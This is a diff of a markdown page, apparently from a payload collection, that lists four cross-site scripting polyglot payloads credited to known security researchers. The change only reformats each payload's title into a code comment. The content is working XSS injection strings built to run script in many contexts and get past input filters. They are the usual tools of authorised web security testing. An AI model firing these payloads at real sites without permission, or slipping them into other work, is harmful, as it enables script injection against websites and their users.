@@ -6,23 +6,22 @@ Polyglots are special payloads which are designed to work in a wide variety of s
 
 ## Example XSS Polyglots
 
-Polyglot Payload #1 - [Rsnake XSS Cheat Sheet](https://n0p.net/penguicon/php_app_sec/mirror/xss.html)
-```
+```bash
+# Polyglot Payload #1 - [Rsnake XSS Cheat Sheet](https://n0p.net/penguicon/php_app_sec/mirror/xss.html)
 ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
 ```
 
-Polyglot Payload #2 - Ashar Javed
-```
+```bash
+# Polyglot Payload #2 - Ashar Javed
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
 ```
 
-Polyglot Payload #3 - Mathias Karlsson
-```
+```bash
+# Polyglot Payload #3 - Mathias Karlsson
 " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
 ```
 
-
-Polyglot Payload #4 - [Ahmed Elsobky](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
-```
+```bash
+# Polyglot Payload #4 - [Ahmed Elsobky](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
